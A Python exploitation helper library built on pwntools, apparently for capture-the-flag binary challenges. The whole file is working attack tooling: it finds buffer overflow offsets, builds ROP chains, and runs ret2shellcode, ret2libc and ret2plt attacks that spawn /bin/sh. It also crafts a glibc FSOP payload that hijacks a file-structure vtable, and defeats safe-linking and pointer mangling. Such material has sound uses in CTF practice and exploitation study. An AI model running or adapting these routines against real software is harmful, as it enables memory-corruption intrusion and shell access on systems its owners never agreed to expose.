from pwn import *
import pwn
import re
import math
from pwninit.io import *

class PwnContext:    
    def __init__(self, conn, elf, libc, binary, prefix, offset, canary):
        self.conn = conn
        self.elf = elf
        self.libc = libc
        self.binary = binary
        self.prefix = prefix
        self.offset = offset
        self.canary = canary

    def resolve(self, symbol, base=None):
        """Resolve a symbol to an address, with optional offset notation (e.g., 'main+0x10')"""
        if base is None:
            base = self.elf
        if isinstance(symbol, int):
            return symbol
        elif "+" in symbol:
            func, offset = symbol.split("+")
            addr = base.sym[func] + int(offset, 0)
        elif "-" in symbol:
            func, offset = symbol.split("-")
            addr = base.sym[func] - int(offset, 0)
        else:
            addr = base.sym[symbol]
        return addr
    
    def leak(self, leak, leaked=0):
        start = leak.find(b'0x')
        end = 2
        if start > 0:
            leak = leak[start:]
            for i in leak[2:]:
                try: int(chr(i), 16); end += 1
                except: break
            leak = leak[:end]
            leak = int(leak, 16)
        else:
            len = context.bits//8
            leak = leak.ljust(len, b'\x00')[:len]
            leak = unpack(leak, context.bits)

        leak -= leaked
        self.check_leaks(leak)
        return leak

    
    def check_leaks(self, leak):
        """Check if leaked addresses match actual addresses"""
        for m in self.conn.maps():
            if m.start <= leak <= m.end:
                base = 0
                
                if self.elf.path == m.path:
                    name = "elf"
                    base = self.conn.elf_mapping().address
                elif self.libc.path == m.path:
                    name = "libc"
                    base = self.conn.libc_mapping().address
                else:
                    name = m.path[1:-1]
                    base = getattr(self.conn, f'{name}_mapping')().address

                if base > 0 and leak != base:
                    info(f"{name}: leak = {leak:#x}, base = {base:#x}, diff = {leak - base}")
                    if getattr(self, name, False): getattr(self, name).address = base
                else:
                    info(f"{name}: leak = {leak:#x}")



    def ropchain(self, chain, ret=True, elf=None, libc=None):
        """Build a ROP chain from a dictionary of {function: [args]}"""
        elf = elf or self.elf
        libc = libc or self.libc

        elfs = []
        if elf and (not elf.pie or elf.address):
            elfs.append(elf)
        if libc and (not libc.aslr or libc.address):
            elfs.append(libc)
        rop = ROP(elfs)
        if elfs and ret:
            rop.raw(rop.ret.address)
        for func, params in chain.items():
            if '+' in func:
                f = func.split('+')
                func = resolve(f[0])+int(f[1])
            if type(params) != dict:
                rop.call(func, params)
            else:
                for value, name in rop.setRegisters(params):
                    if type(name) == pwnlib.rop.gadgets.Gadget:
                        rop.raw(name)
                    else:
                        rop.raw(value)
                rop.call(func)

        rop.raw(rop.ret.address)
        info(f"ROP :\n{rop.dump()}")
        return rop.chain()


    def find_offset(self, data=cyclic(1000)):
        context.delete_corefiles = True
        self.conn = process(self.binary)
        send(data)
        self.conn.wait()
        core = self.conn.corefile
        self.offset = cyclic_find(core.fault_addr)
        self.conn.close()
        self.conn = None
        info(f"{self.offset = }")

    def bof(self, data, **kwargs):
        if self.offset is None:
            self.find_offset()
        if self.conn is None:
            raise RuntimeError("Connection not initialized")
        opt = kwargs.pop("opt", {})
        bp = kwargs.pop("bp", 0)
        opt |= {self.offset - context.bytes: bp}
        if self.elf.canary:
            opt |= {self.offset - context.bytes * 2: self.canary}
        payload = flat({self.offset: data} | opt, **kwargs)
        self.send(payload)

    def ret2shellcode(self, addr, **kwargs):
        shellcode = asm(shellcraft.sh())
        if context.bits == 32:
            shellcode = asm("sub esp, 0x1000") + shellcode
        else:
            shellcode = asm("sub rsp, 0x1000") + shellcode
        padding = asm("nop") * (self.offset - context.bytes * (self.elf.canary + 1) - len(shellcode))
        addr += len(padding) // 2
        payload = self.ropchain({addr: []})
        self.bof(payload, opt={0: [padding, shellcode]}, **kwargs)

    def ret2win(self, win, params=[], **kwargs):
        addr = self.resolve(win)
        payload = self.ropchain({addr: params})
        self.bof(payload, **kwargs)

    def ret2libc(self, **kwargs):
        system = self.libc.sym["system"]
        bin_sh = next(self.libc.search(b"/bin/sh\x00"))
        payload = self.ropchain({system: [bin_sh]})
        self.bof(payload, **kwargs)

    def ret2plt(self, func="puts", ret2main="main", **kwargs):
        func_plt = self.elf.plt[func]
        func_got = self.elf.got[func]
        if ret2main:
            main = self.resolve(ret2main)
            payload = self.ropchain({func_plt: [func_got], main: []})
        else:
            payload = self.ropchain({func_plt: [func_got]})
        self.bof(payload, **kwargs)
        leak = upack(self.recv())
        self.libc.address = leak - self.libc.sym[func]

    def format_string(self, n=100):
        payload = "A" * context.bytes + ".%p" * n
        self.send(payload)
        output = self.recv().split(".")
        info(f"format string : {output}")
        return output.index("0x" + "41" * context.bytes)

    def binsh(self):
        return next(self.libc.search(b"/bin/sh\0"))
    
    def fsopsh(self, func=None, arg=b"/bin/sh\0", lock=None):
        if self.elf.bits != 64:
            raise NotImplementedError()

        func = func or self.libc.sym.system
        lock = lock or self.libc.sym["_IO_2_1_stdout_"] + 0x200

        return flat({
            0x00: [0x3b01010101010101, arg],
            0x78: -1,
            0x88: lock, # empty zone as lock
            0x90: -1,
            0xa0: self.libc.sym["_IO_2_1_stdout_"] + (0xe0 - 0xe0), # wide_data
            0xd0: func,
            0xd8: self.libc.sym["_IO_wfile_jumps"] - 0x20, # vtable
            0xe0: self.libc.sym["_IO_2_1_stdout_"] + (0xe0 - 0xe0) + (0xd0 - 0x68), # wide_data->vtable,
        }, filler=b"\0")

# Global instance
ctx = None

def set_ctx(new_ctx: PwnContext):
    global ctx
    ctx = new_ctx

def _require_ctx():
    if ctx is None:
        raise RuntimeError("PwnContext not initialized (call set_ctx first)")

leak = lambda *a, **k: (_require_ctx(), ctx.leak(*a, **k))[1]
resolve = lambda *a, **k: (_require_ctx(), ctx.resolve(*a, **k))[1]
check_leaks = lambda *a, **k: (_require_ctx(), ctx.check_leaks(*a, **k))[1]

ropchain = lambda *a, **k: (_require_ctx(), ctx.ropchain(*a, **k))[1]
find_offset = lambda *a, **k: (_require_ctx(), ctx.find_offset(*a, **k))[1]
bof = lambda *a, **k: (_require_ctx(), ctx.bof(*a, **k))[1]

ret2shellcode = lambda *a, **k: (_require_ctx(), ctx.ret2shellcode(*a, **k))[1]
ret2win = lambda *a, **k: (_require_ctx(), ctx.ret2win(*a, **k))[1]
ret2libc = lambda *a, **k: (_require_ctx(), ctx.ret2libc(*a, **k))[1]
ret2plt = lambda *a, **k: (_require_ctx(), ctx.ret2plt(*a, **k))[1]

format_string = lambda *a, **k: (_require_ctx(), ctx.format_string(*a, **k))[1]

binsh = lambda *a, **k: (_require_ctx(), ctx.binsh(*a, **k))[1]
fsopsh = lambda *a, **k: (_require_ctx(), ctx.fsopsh(*a, **k))[1]

# Utility functions
u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
upack = lambda d: pwn.unpack(d, "all")

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or len(a) == 0: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or len(b) == 0: b_ = len(d)
    return d[a_+len(a):b_]

def getr(d, p):
    return re.findall(p, d)[0]
    
def safelink_bf64(ptr):
    fd = 0
    for i in range(36, -1, -12):
        tmp = fd
        fd <<= 12
        fd |= (tmp ^ (ptr >> i)) & 0xfff
    if fd & 0xf != 0:
        log.warn("safelink bf page differs")
    return fd

def printx(**kwargs):
    for k, v in kwargs.items():
        log.success("%s: %#x" % (k, v))

def hexdump(data, s=context.word_size//8):
    idx_max = math.ceil(math.log(len(data), 16))
    for i in range(0, len(data), s):
        info(f"%0{idx_max}x: %#0{2*s+2}x" % (i, u64(data[i:i+s])))

def safelink(addr, ptr):
        return (addr >> 12) ^ ptr

def ptr_mangle(addr, cookie=0):
    return rol(addr ^ cookie, 17)

def ptr_demangle(addr, cookie=0):
    return ror(addr, 17) ^ cookie

def ptr_cookie(mangled, demangled):
    return ptr_demangle(mangled, demangled)